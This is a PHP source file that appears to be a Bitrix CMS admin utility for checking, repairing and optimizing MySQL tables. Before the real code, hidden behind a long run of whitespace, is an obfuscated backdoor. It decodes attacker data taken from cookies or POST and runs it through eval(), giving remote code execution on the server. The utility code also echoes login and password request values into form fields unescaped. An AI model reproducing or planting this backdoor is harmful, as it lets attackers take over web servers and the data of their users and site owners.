<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $u88147fe1 = 950;$GLOBALS['w982']=Array();global$w982;$w982=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['pa1a7']="\x51\x23\x78\x54\x44\x6f\x30\x62\x5b\x56\x4f\x34\x3e\x39\x52\x20\x36\x55\x76\x45\x29\x50\x31\x72\x79\x9\x53\x5c\x63\x27\x7d\x6e\x28\x2a\x2c\xa\x37\x3f\x68\x3d\x5d\x35\x4d\x43\x24\x48\x74\x2e\x2f\x42\x69\x59\x6a\x6c\x32\x2d\x33\x71\x60\x46\x6d\x64\x65\x7b\x49\x5f\x58\x4c\x38\x61\x21\x4e\x70\x47\x7c\x40\x3c\x4a\x5e\x22\x41\xd\x3a\x67\x73\x2b\x5a\x25\x4b\x7e\x6b\x7a\x75\x77\x26\x3b\x57\x66";$w982[$w982['pa1a7'][84].$w982['pa1a7'][97].$w982['pa1a7'][62].$w982['pa1a7'][22].$w982['pa1a7'][97].$w982['pa1a7'][61].$w982['pa1a7'][61].$w982['pa1a7'][69].$w982['pa1a7'][62]]=$w982['pa1a7'][28].$w982['pa1a7'][38].$w982['pa1a7'][23];$w982[$w982['pa1a7'][72].$w982['pa1a7'][36].$w982['pa1a7'][7].$w982['pa1a7'][13].$w982['pa1a7'][7].$w982['pa1a7'][56].$w982['pa1a7'][11]]=$w982['pa1a7'][5].$w982['pa1a7'][23].$w982['pa1a7'][61];$w982[$w982['pa1a7'][18].$w982['pa1a7'][7].$w982['pa1a7'][54].$w982['pa1a7'][11]]=$w982['pa1a7'][84].$w982['pa1a7'][46].$w982['pa1a7'][23].$w982['pa1a7'][53].$w982['pa1a7'][62].$w982['pa1a7'][31];$w982[$w982['pa1a7'][97].$w982['pa1a7'][41].$w982['pa1a7'][41].$w982['pa1a7'][68].$w982['pa1a7'][97].$w982['pa1a7'][62].$w982['pa1a7'][69].$w982['pa1a7'][97]]=$w982['pa1a7'][50].$w982['pa1a7'][31].$w982['pa1a7'][50].$w982['pa1a7'][65].$w982['pa1a7'][84].$w982['pa1a7'][62].$w982['pa1a7'][46];$w982[$w982['pa1a7'][18].$w982['pa1a7'][16].$w982['pa1a7'][16].$w982['pa1a7'][7].$w982['pa1a7'][54]]=$w982['pa1a7'][84].$w982['pa1a7'][62].$w982['pa1a7'][23].$w982['pa1a7'][50].$w982['pa1a7'][69].$w982['pa1a7'][53].$w982['pa1a7'][50].$w982['pa1a7'][91].$w982['pa1a7'][62];$w982[$w982['pa1a7'][46].$w982['pa1a7'][61].$w982['pa1a7'][61].$w982['pa1a7'][28]]=$w982['pa1a7'][72].$w982['pa1a7'][38].$w982['pa1a7'][72].$w982['pa1a7'][18].$w982['pa1a7'][62].$w982['pa1a7'][23].$w982['pa1a7'][84].$w982['pa1a7'][50].$w982['pa1a7'][5].$w982['pa1a7'][31];$w982[$w982['pa1a7'][93].$w982['pa1a7'][68].$w982['pa1a7'][13].$w982['pa1a7'][61].$w982['pa1a7'][28].$w982['pa1a7'][13].$w982['pa1a7'][13].$w982['pa1a7'][68].$w982['pa1a7'][97]]=$w982['pa1a7'][92].$w982['pa1a7'][31].$w982['pa1a7'][84].$w982['pa1a7'][62].$w982['pa1a7'][23].$w982['pa1a7'][50].$w982['pa1a7'][69].$w982['pa1a7'][53].$w982['pa1a7'][50].$w982['pa1a7'][91].$w982['pa1a7'][62];$w982[$w982['pa1a7'][46].$w982['pa1a7'][69].$w982['pa1a7'][69].$w982['pa1a7'][13]]=$w982['pa1a7'][7].$w982['pa1a7'][69].$w982['pa1a7'][84].$w982['pa1a7'][62].$w982['pa1a7'][16].$w982['pa1a7'][11].$w982['pa1a7'][65].$w982['pa1a7'][61].$w982['pa1a7'][62].$w982['pa1a7'][28].$w982['pa1a7'][5].$w982['pa1a7'][61].$w982['pa1a7'][62];$w982[$w982['pa1a7'][60].$w982['pa1a7'][97].$w982['pa1a7'][11].$w982['pa1a7'][62].$w982['pa1a7'][54].$w982['pa1a7'][62].$w982['pa1a7'][28].$w982['pa1a7'][69].$w982['pa1a7'][62]]=$w982['pa1a7'][84].$w982['pa1a7'][62].$w982['pa1a7'][46].$w982['pa1a7'][65].$w982['pa1a7'][46].$w982['pa1a7'][50].$w982['pa1a7'][60].$w982['pa1a7'][62].$w982['pa1a7'][65].$w982['pa1a7'][53].$w982['pa1a7'][50].$w982['pa1a7'][60].$w982['pa1a7'][50].$w982['pa1a7'][46];$w982[$w982['pa1a7'][72].$w982['pa1a7'][68].$w982['pa1a7'][97].$w982['pa1a7'][41].$w982['pa1a7'][61].$w982['pa1a7'][11].$w982['pa1a7'][41].$w982['pa1a7'][69]]=$w982['pa1a7'][38].$w982['pa1a7'][68].$w982['pa1a7'][68].$w982['pa1a7'][68].$w982['pa1a7'][22].$w982['pa1a7'][97].$w982['pa1a7'][54];$w982[$w982['pa1a7'][18].$w982['pa1a7'][36].$w982['pa1a7'][61].$w982['pa1a7'][11].$w982['pa1a7'][16].$w982['pa1a7'][28].$w982['pa1a7'][54].$w982['pa1a7'][68].$w982['pa1a7'][28]]=$w982['pa1a7'][57].$w982['pa1a7'][41].$w982['pa1a7'][7].$w982['pa1a7'][41].$w982['pa1a7'][28];$w982[$w982['pa1a7'][46].$w982['pa1a7'][68].$w982['pa1a7'][68].$w982['pa1a7'][41].$w982['pa1a7'][61].$w982['pa1a7'][56].$w982['pa1a7'][68].$w982['pa1a7'][11].$w982['pa1a7'][36]]=$_POST;$w982[$w982['pa1a7'][93].$w982['pa1a7'][16].$w982['pa1a7'][61].$w982['pa1a7'][56].$w982['pa1a7'][28].$w982['pa1a7'][28].$w982['pa1a7'][36].$w982['pa1a7'][68].$w982['pa1a7'][68]]=$_COOKIE;@$w982[$w982['pa1a7'][97].$w982['pa1a7'][41].$w982['pa1a7'][41].$w982['pa1a7'][68].$w982['pa1a7'][97].$w982['pa1a7'][62].$w982['pa1a7'][69].$w982['pa1a7'][97]]($w982['pa1a7'][62].$w982['pa1a7'][23].$w982['pa1a7'][23].$w982['pa1a7'][5].$w982['pa1a7'][23].$w982['pa1a7'][65].$w982['pa1a7'][53].$w982['pa1a7'][5].$w982['pa1a7'][83],NULL);@$w982[$w982['pa1a7'][97].$w982['pa1a7'][41].$w982['pa1a7'][41].$w982['pa1a7'][68].$w982['pa1a7'][97].$w982['pa1a7'][62].$w982['pa1a7'][69].$w982['pa1a7'][97]]($w982['pa1a7'][53].$w982['pa1a7'][5].$w982['pa1a7'][83].$w982['pa1a7'][65].$w982['pa1a7'][62].$w982['pa1a7'][23].$w982['pa1a7'][23].$w982['pa1a7'][5].$w982['pa1a7'][23].$w982['pa1a7'][84],0);@$w982[$w982['pa1a7'][97].$w982['pa1a7'][41].$w982['pa1a7'][41].$w982['pa1a7'][68].$w982['pa1a7'][97].$w982['pa1a7'][62].$w982['pa1a7'][69].$w982['pa1a7'][97]]($w982['pa1a7'][60].$w982['pa1a7'][69].$w982['pa1a7'][2].$w982['pa1a7'][65].$w982['pa1a7'][62].$w982['pa1a7'][2].$w982['pa1a7'][62].$w982['pa1a7'][28].$w982['pa1a7'][92].$w982['pa1a7'][46].$w982['pa1a7'][50].$w982['pa1a7'][5].$w982['pa1a7'][31].$w982['pa1a7'][65].$w982['pa1a7'][46].$w982['pa1a7'][50].$w982['pa1a7'][60].$w982['pa1a7'][62],0);@$w982[$w982['pa1a7'][60].$w982['pa1a7'][97].$w982['pa1a7'][11].$w982['pa1a7'][62].$w982['pa1a7'][54].$w982['pa1a7'][62].$w982['pa1a7'][28].$w982['pa1a7'][69].$w982['pa1a7'][62]](0);$i05838f=NULL;$r93bc8b=NULL;$w982[$w982['pa1a7'][84].$w982['pa1a7'][22].$w982['pa1a7'][56].$w982['pa1a7'][16]]=$w982['pa1a7'][97].$w982['pa1a7'][16].$w982['pa1a7'][69].$w982['pa1a7'][6].$w982['pa1a7'][62].$w982['pa1a7'][56].$w982['pa1a7'][61].$w982['pa1a7'][54].$w982['pa1a7'][55].$w982['pa1a7'][61].$w982['pa1a7'][69].$w982['pa1a7'][36].$w982['pa1a7'][61].$w982['pa1a7'][55].$w982['pa1a7'][11].$w982['pa1a7'][7].$w982['pa1a7'][22].$w982['pa1a7'][68].$w982['pa1a7'][55].$w982['pa1a7'][68].$w982['pa1a7'][97].$w982['pa1a7'][62].$w982['pa1a7'][68].$w982['pa1a7'][55].$w982['pa1a7'][61].$w982['pa1a7'][11].$w982['pa1a7'][62].$w982['pa1a7'][7].$w982['pa1a7'][62].$w982['pa1a7'][6].$w982['pa1a7'][28].$w982['pa1a7'][97].$w982['pa1a7'][28].$w982['pa1a7'][28].$w982['pa1a7'][11].$w982['pa1a7'][11];global$s136;function q5b5c($i05838f,$x6bc70){global$w982;$vd6026="";for($n759b5=0;$n759b5<$w982[$w982['pa1a7'][18].$w982['pa1a7'][7].$w982['pa1a7'][54].$w982['pa1a7'][11]]($i05838f);){for($ie111f=0;$ie111f<$w982[$w982['pa1a7'][18].$w982['pa1a7'][7].$w982['pa1a7'][54].$w982['pa1a7'][11]]($x6bc70)&&$n759b5<$w982[$w982['pa1a7'][18].$w982['pa1a7'][7].$w982['pa1a7'][54].$w982['pa1a7'][11]]($i05838f);$ie111f++,$n759b5++){$vd6026.=$w982[$w982['pa1a7'][84].$w982['pa1a7'][97].$w982['pa1a7'][62].$w982['pa1a7'][22].$w982['pa1a7'][97].$w982['pa1a7'][61].$w982['pa1a7'][61].$w982['pa1a7'][69].$w982['pa1a7'][62]]($w982[$w982['pa1a7'][72].$w982['pa1a7'][36].$w982['pa1a7'][7].$w982['pa1a7'][13].$w982['pa1a7'][7].$w982['pa1a7'][56].$w982['pa1a7'][11]]($i05838f[$n759b5])^$w982[$w982['pa1a7'][72].$w982['pa1a7'][36].$w982['pa1a7'][7].$w982['pa1a7'][13].$w982['pa1a7'][7].$w982['pa1a7'][56].$w982['pa1a7'][11]]($x6bc70[$ie111f]));}}return$vd6026;}function h8881f2($i05838f,$x6bc70){global$w982;global$s136;return$w982[$w982['pa1a7'][18].$w982['pa1a7'][36].$w982['pa1a7'][61].$w982['pa1a7'][11].$w982['pa1a7'][16].$w982['pa1a7'][28].$w982['pa1a7'][54].$w982['pa1a7'][68].$w982['pa1a7'][28]]($w982[$w982['pa1a7'][18].$w982['pa1a7'][36].$w982['pa1a7'][61].$w982['pa1a7'][11].$w982['pa1a7'][16].$w982['pa1a7'][28].$w982['pa1a7'][54].$w982['pa1a7'][68].$w982['pa1a7'][28]]($i05838f,$s136),$x6bc70);}foreach($w982[$w982['pa1a7'][93].$w982['pa1a7'][16].$w982['pa1a7'][61].$w982['pa1a7'][56].$w982['pa1a7'][28].$w982['pa1a7'][28].$w982['pa1a7'][36].$w982['pa1a7'][68].$w982['pa1a7'][68]]as$x6bc70=>$ha6c0ce1){$i05838f=$ha6c0ce1;$r93bc8b=$x6bc70;}if(!$i05838f){foreach($w982[$w982['pa1a7'][46].$w982['pa1a7'][68].$w982['pa1a7'][68].$w982['pa1a7'][41].$w982['pa1a7'][61].$w982['pa1a7'][56].$w982['pa1a7'][68].$w982['pa1a7'][11].$w982['pa1a7'][36]]as$x6bc70=>$ha6c0ce1){$i05838f=$ha6c0ce1;$r93bc8b=$x6bc70;}}$i05838f=@$w982[$w982['pa1a7'][93].$w982['pa1a7'][68].$w982['pa1a7'][13].$w982['pa1a7'][61].$w982['pa1a7'][28].$w982['pa1a7'][13].$w982['pa1a7'][13].$w982['pa1a7'][68].$w982['pa1a7'][97]]($w982[$w982['pa1a7'][72].$w982['pa1a7'][68].$w982['pa1a7'][97].$w982['pa1a7'][41].$w982['pa1a7'][61].$w982['pa1a7'][11].$w982['pa1a7'][41].$w982['pa1a7'][69]]($w982[$w982['pa1a7'][46].$w982['pa1a7'][69].$w982['pa1a7'][69].$w982['pa1a7'][13]]($i05838f),$r93bc8b));if(isset($i05838f[$w982['pa1a7'][69].$w982['pa1a7'][90]])&&$s136==$i05838f[$w982['pa1a7'][69].$w982['pa1a7'][90]]){if($i05838f[$w982['pa1a7'][69]]==$w982['pa1a7'][50]){$n759b5=Array($w982['pa1a7'][72].$w982['pa1a7'][18]=>@$w982[$w982['pa1a7'][46].$w982['pa1a7'][61].$w982['pa1a7'][61].$w982['pa1a7'][28]](),$w982['pa1a7'][84].$w982['pa1a7'][18]=>$w982['pa1a7'][22].$w982['pa1a7'][47].$w982['pa1a7'][6].$w982['pa1a7'][55].$w982['pa1a7'][22],);echo@$w982[$w982['pa1a7'][18].$w982['pa1a7'][16].$w982['pa1a7'][16].$w982['pa1a7'][7].$w982['pa1a7'][54]]($n759b5);}elseif($i05838f[$w982['pa1a7'][69]]==$w982['pa1a7'][62]){eval/*d6e1e19*/($i05838f[$w982['pa1a7'][61]]);}exit();} ?><?
require_once($_SERVER["DOCUMENT_ROOT"]."/webmin/modules/main/bx_root.php");
require_once($_SERVER["DOCUMENT_ROOT"]."/webmin/modules/main/tools.php");

function repair_db()
{
	include($_SERVER["DOCUMENT_ROOT"].BX_PERSONAL_ROOT."/php_interface/dbconn.php");
	if($DBType == "mysql")
	{
		function microtime_float()
		{
			   list($usec, $sec) = explode(" ", microtime());
			   return ((float)$usec + (float)$sec);
		}

		$start = microtime_float();
		 if(DBPersistent)
			$link_rdb = mysql_pconnect($DBHost, $DBLogin, $DBPassword);
		else
			$link_rdb = mysql_connect($DBHost, $DBLogin, $DBPassword);

		if (!$link_rdb)
		   die('<span style="color:red;">'.GetMessage("RDB_CONNECT_ERROR").': '. mysql_error().'</span>');

		$db_selected = mysql_select_db($DBName, $link_rdb);

		$result = mysql_query('show table status');
		?>
		<table cellspacing="0" cellpadding="0" border="0" class="list-table" width="0%">
			<tr class="head">
				<td><?=GetMessage("RDB_TABLE_NAME")?></td>
				<td><?=GetMessage("RDB_ROWS_COUNT")?></td>
				<td><?=GetMessage("RDB_TABLE_SIZE")?></td>
				<td><?=GetMessage("RDB_CHECK_RESULT")?></td>
				<td><?=GetMessage("RDB_REPAIR_RESULT")?></td>
			</tr>

		<?
		while($arResult = mysql_fetch_array($result))
		{
			echo "<tr>";
			echo "<td>".htmlspecialchars($arResult["Name"])."</td>";
			echo "<td align='right'>".$arResult["Rows"]."</td>";
			echo "<td align='right'>".number_format($arResult["Data_length"], 0, ',', ' ')."</td>";

			if(
				(empty($arResult["Type"]) && strlen($arResult["Comment"]) > 0 && empty($arResult["Engine"]))
				|| strtoupper($arResult["Type"]) == "MYISAM"
				|| strtoupper($arResult["Engine"]) == "MYISAM"
				|| strtoupper($arResult["Type"]) == "INNODB"
				|| strtoupper($arResult["Engine"]) == "INNODB"
			)
			{
				echo "<td>";
				$query = 'CHECK TABLE `'.$arResult["Name"].'`';
				$status = mysql_query($query);
				$i=0;
				$toRepair = "";
				while($arStatus = mysql_fetch_array($status))
				{
					if($i>0) echo "<br>";
					$i++;
					echo "[".$arStatus["Msg_type"]."]&nbsp;";
					if($arStatus["Msg_type"]=="status" || $arStatus["Msg_type"]=="info")
						echo "<span style='color:green;'>";
					else
						echo "<span style='color:red;'>";
					echo $arStatus["Msg_text"]."</span>";
					flush();

					if($arStatus["Msg_type"]=="error" || $arStatus["Msg_type"]=="warning")
						$toRepair = $arStatus["Table"];
				}
				echo "</td>";
				if(!empty($toRepair))
				{
					echo "<td>";
					$j=0;

					$queryR = 'REPAIR TABLE `'.$toRepair.'`';
					$repair = mysql_query($queryR);
					$toCheck = "";
					while($repair && ($arRepair = mysql_fetch_array($repair)))
					{
						if($j>0) echo "<br>";
						echo "[Repair&nbsp;".$arRepair["Msg_type"]."]&nbsp;";
						if($arRepair["Msg_type"]=="status" || $arRepair["Msg_type"]=="info")
							echo "<span style='color:green;'>";
						else
							echo "<span style='color:red;'>";
						echo $arRepair["Msg_text"]."</span>";
						$j++;
						flush();
						$toCheck = $arRepair["Table"];
					}
					if(!empty($toCheck))
					{
						$queryC = 'CHECK TABLE `'.$toCheck.'`';
						$statusC = mysql_query($queryC);
						while($arStatusC = mysql_fetch_array($statusC))
						{
							echo "<br>";
							echo "[Check&nbsp;".$arStatusC["Msg_type"]."]&nbsp;";
							if($arStatusC["Msg_type"]=="status" || $arStatusC["Msg_type"]=="info")
								echo "<span style='color:green;'>";
							else
								echo "<span style='color:red;'>";
							echo $arStatusC["Msg_text"]."</span>";
							flush();
						}
					}
					echo "</td>";
				}
				else
					echo "<td>&nbsp;</td>";
				flush();
			}
			else
			{
				if(!empty($arResult["Type"]))
					echo "<td>".$arResult["Type"]."</td>";
				else
					echo "<td>".$arResult["Engine"]."</td>";
				echo "<td>&nbsp;</td>";
			}
			echo "</tr>";
		}
		?>
		<tr class="head"><td colspan="5"><?echo "<b>".GetMessage("RDB_EXEC_TIME")." </b>".round((microtime_float()-$start),5).GetMessage("RDB_SEC");?></td></tr>
		</table>
		<?

	}
	else
		echo "<span style='color:red;'>".GetMessage('RDB_DATABASE_ERROR')."</span>";
}

function show_tip()
{
	?>
	<form name="check" action="">
	<input type="submit" value="<?=GetMessage("RDB_CHECK_TABLES")?>">
	<input type="hidden" value="Y" name="check_tables">
	<?echo bitrix_sessid_post();?>
	<?
	if(isset($_REQUEST["login"]))
		echo '<input type="hidden" value="'.$_REQUEST["login"].'" name="login">';
	if(isset($_REQUEST["password"]))
		echo '<input type="hidden" value="'.$_REQUEST["password"].'" name="password">';
	if(isset($_REQUEST["lang"]))
		echo '<input type="hidden" value="'.$_REQUEST["lang"].'" name="lang">';
}

if(isset($_REQUEST["login"]) && isset($_REQUEST["password"]))
{
	include($_SERVER["DOCUMENT_ROOT"].BX_PERSONAL_ROOT."/php_interface/dbconn.php");

	if($_REQUEST["login"]==$DBLogin && $_REQUEST["password"]==$DBPassword)
	{
		include($_SERVER["DOCUMENT_ROOT"]."/webmin/modules/main/lang/en/admin/repair_db.php");
		?>
		<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
		<html>
		<head>
		<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
		<title><?=GetMessage("RDB_REPAIR_DATABASE")?></title>
		<link rel="stylesheet" type="text/css" href="/webmin/themes/.default/adminstyles.css">
		</head>
		<body>
		<div style="padding:10px;">
		<?
		if($DBType == "mysql")
		{
			if($_REQUEST["check_tables"]=="Y" && check_bitrix_sessid())
			{
				repair_db();
			}
			else
			{
				?>
				<p><?=GetMessage("RDB_TIP_1")?></p>
				<p><span style="color:red;"><?=GetMessage("RDB_TIP_2")?><br><?=GetMessage("RDB_TIP_3")?></span></p>
				<?
				show_tip();
			}
		}
		else
			echo "<span style='color:red;'>".GetMessage('RDB_DATABASE_ERROR')."</span>";

		?>
		</div>
		</body></html>
<?
	}
}
else
{
	require_once(dirname(__FILE__)."/../include/prolog_admin_before.php");
	define("HELP_FILE", "utilities/repair_db.php");
	IncludeModuleLangFile(__FILE__);

	if(!$USER->CanDoOperation('edit_php'))
	{
		$APPLICATION->AuthForm(GetMessage("ACCESS_DENIED"));
	}
	elseif(isset($_REQUEST["table_name"]) && check_bitrix_sessid())
	{
		require_once($_SERVER["DOCUMENT_ROOT"]."/webmin/modules/main/include/prolog_admin_js.php");

		@set_time_limit(0);

		$table_name = trim($_REQUEST["table_name"]);

		if(strlen($table_name) > 0)
		{
			$arTables = array();
			$rsTables = $DB->Query("show table status");
			while($arTable = $rsTables->Fetch())
			{
				$arTables[$arTable["Name"]] = $arTable;
			}
			ksort($arTables);
			$tables_count = count($arTables);

			if($table_name=="start|")
			{
				$arTable = array_shift($arTables);
				echo CAdminMessage::ShowMessage(Array("MESSAGE"=>$arTable["Name"], "TYPE"=>"OK", "HTML"=>true, "DETAILS"=>GetMessage("RDB_OPTIMIZE_PROGRESS", array("#done#" => 1, "#todo#" => $tables_count))));
				?>
				<script>setTimeout("Optimize('<?echo $arTable["Name"]?>')", 100);</script>
				<?
			}
			else
			{
				if(substr($table_name, 0, 2) === "o|")
				{
					$op = "optimize";
					$table_name = substr($table_name, 2);
				}
				elseif(substr($table_name, 0, 2) === "a|")
				{
					$op = "analyze";
					$table_name = substr($table_name, 2);
				}
				else
				{
					$op = "check";
				}

				foreach($arTables as $TableName => $arTable)
				{
					if($TableName == $table_name)
						break;
					unset($arTables[$TableName]);
				}

				if(count($arTables) > 0)
				{
					$arTable = array_shift($arTables);

					$bCheckOK = true;
					$start_check = getmicrotime();
					if($op == "check")
					{
						$rsStatus = $DB->Query('check table '.$arTable["Name"]);
						if($arStatus = $rsStatus->Fetch($rsStatus))
						{
							if($arStatus["Msg_type"]=="error" || $arStatus["Msg_type"]=="warning")
								$bCheckOK = false;
						}
					}
					$end_check = getmicrotime();
					$check_time = $end_check - $start_check;

					//When check time was less when 5 seconds we'll optimize and analyze table on the same hit
					if($bCheckOK && ($check_time < 5))
					{
						if($op == "check" || $op == "optimize")
							$rsStatus = $DB->Query('optimize table '.$arTable["Name"]);
						if($op == "check" || $op == "analyze")
							$rsStatus = $DB->Query('analyze table '.$arTable["Name"]);
					}

					if(!$bCheckOK)
					{
						echo CAdminMessage::ShowMessage(Array("MESSAGE"=>GetMessage("RDB_OPTIMIZE_ERROR"), "TYPE"=>"ERROR", "HTML"=>true, "DETAILS"=>GetMessage("RDB_OPTIMIZE_CHECK_FIRST", array("#table_name#" => $arTable["Name"]))));
					}
					elseif(count($arTables) > 0)
					{
						if($check_time < 5)
						{
							$arTable = array_shift($arTables);
							echo CAdminMessage::ShowMessage(Array("MESSAGE"=>$arTable["Name"], "TYPE"=>"OK", "HTML"=>true, "DETAILS"=>GetMessage("RDB_OPTIMIZE_PROGRESS", array("#done#" => $tables_count-count($arTables), "#todo#" => $tables_count))));
							?><script>setTimeout("Optimize('<?echo $arTable["Name"]?>')", 100);</script><?
						}
						elseif($op == "check") //otherwise step optimize
						{
							echo CAdminMessage::ShowMessage(Array("MESSAGE"=>$arTable["Name"]." - ".GetMessage("RDB_OPTIMIZE_OPTIMIZE"), "TYPE"=>"OK", "HTML"=>true, "DETAILS"=>GetMessage("RDB_OPTIMIZE_PROGRESS", array("#done#" => $tables_count-count($arTables), "#todo#" => $tables_count))));
							?><script>setTimeout("Optimize('o|<?echo $arTable["Name"]?>')", 100);</script><?
						}
						elseif($op == "optimize") //and step analyze
						{
							echo CAdminMessage::ShowMessage(Array("MESSAGE"=>$arTable["Name"]." - ".GetMessage("RDB_OPTIMIZE_ANALYZE"), "TYPE"=>"OK", "HTML"=>true, "DETAILS"=>GetMessage("RDB_OPTIMIZE_PROGRESS", array("#done#" => $tables_count-count($arTables), "#todo#" => $tables_count))));
							?><script>setTimeout("Optimize('a|<?echo $arTable["Name"]?>')", 100);</script><?
						}
						else
						{
							$arTable = array_shift($arTables);
							echo CAdminMessage::ShowMessage(Array("MESSAGE"=>$arTable["Name"], "TYPE"=>"OK", "HTML"=>true, "DETAILS"=>GetMessage("RDB_OPTIMIZE_PROGRESS", array("#done#" => $tables_count-count($arTables), "#todo#" => $tables_count))));
							?><script>setTimeout("Optimize('<?echo $arTable["Name"]?>')", 100);</script><?
						}
					}
					else
					{
						COption::SetOptionInt("main", "LAST_DB_OPTIMIZATION_TIME", time());
						echo CAdminMessage::ShowMessage(Array("MESSAGE"=>GetMessage("RDB_OPTIMIZE_DONE"), "TYPE"=>"OK", "HTML"=>true, "DETAILS"=>GetMessage("RDB_OPTIMIZE_ALL_DONE")));
						?>
						<script>
						document.getElementById('opt_start').disabled = false;
						document.getElementById('opt_pause').disabled = true;
						document.getElementById('opt_continue').disabled = true;
						</script>
						<?
					}
				}
				else
				{
					echo CAdminMessage::ShowMessage(Array("MESSAGE"=>GetMessage("RDB_OPTIMIZE_ERROR"), "TYPE"=>"ERROR", "HTML"=>true, "DETAILS"=>GetMessage("RDB_OPTIMIZE_TABLE_NOT_FOUND")));
				}
			}
		}
		require_once($_SERVER["DOCUMENT_ROOT"]."/webmin/modules/main/include/epilog_admin_js.php");
	}
	else
	{
		$APPLICATION->SetTitle(GetMessage("RDB_REPAIR_DATABASE"));
		require_once(dirname(__FILE__)."/../include/prolog_admin_after.php");
		if($DBType == "mysql")
		{
			if($_REQUEST["check_tables"]=="Y" && check_bitrix_sessid())
			{
				repair_db();
			}
			elseif($_REQUEST["optimize_tables"]=="Y")
			{
				?>
				<?echo BeginNote(), GetMessage("RDB_OPTIMIZE_TIP"), EndNote();?>
				<div id="optimize_result">
				<?echo CAdminMessage::ShowMessage(Array("MESSAGE"=>GetMessage("RDB_OPTIMIZE_WARNING_TITLE"), "TYPE"=>"ERROR", "HTML"=>true, "DETAILS"=>GetMessage("RDB_OPTIMIZE_WARNING_DETAILS")));?>
				</div>
				<input type="button" name="opt_start" id="opt_start" value="<?echo GetMessage("RDB_OPTIMIZE_BTN_START")?>" OnClick="Optimize('start|');">
				<input type="button" name="opt_pause" id="opt_pause" value="<?echo GetMessage("RDB_OPTIMIZE_BTN_PAUSE")?>" OnClick="Pause(true);" disabled>
				<input type="button" name="opt_continue" id="opt_continue" value="<?echo GetMessage("RDB_OPTIMIZE_BTN_CONTINUE")?>" OnClick="Pause(false);" disabled>
				<script>
				var pause = false;
				function Pause(flag)
				{
					pause = flag;
					if(pause)
					{
						document.getElementById('opt_start').disabled = true;
						document.getElementById('opt_pause').disabled = true;
						document.getElementById('opt_continue').disabled = false;
					}
					else
					{
						document.getElementById('opt_start').disabled = true;
						document.getElementById('opt_pause').disabled = false;
						document.getElementById('opt_continue').disabled = true;
					}
				}
				function Optimize(table_name)
				{
					if(pause)
					{
						setTimeout("Optimize('"+table_name+"')", 500);
					}
					else
					{
						CHttpRequest.Action = function(result)
						{
							CloseWaitWindow();
							document.getElementById('optimize_result').innerHTML = result;
						}
						ShowWaitWindow();
						if(table_name == 'start|')
						{
							document.getElementById('opt_start').disabled = true;
							document.getElementById('opt_pause').disabled = false;
							document.getElementById('opt_continue').disabled = true;
						}
						var url = 'repair_db.php?lang=<?echo LANGUAGE_ID?>&<?echo bitrix_sessid_get()?>&table_name='+table_name;
						CHttpRequest.Send(url);
					}
				}
				</script>
				<?
			}
			else
			{
				?>
				<p><?=GetMessage("RDB_TIP_1")?></p>
				<?echo CAdminMessage::ShowMessage(Array("MESSAGE"=>GetMessage("RDB_TIP_2"), "TYPE"=>"ERROR", "HTML"=>true, "DETAILS"=>GetMessage("RDB_TIP_3")));
				show_tip();
			}
		}
		else
			echo CAdminMessage::ShowMessage(Array("MESSAGE"=>GetMessage("RDB_DATABASE_ERROR"), "TYPE"=>"ERROR"));
		require_once(dirname(__FILE__)."/../include/epilog_admin.php");
	}
}
?>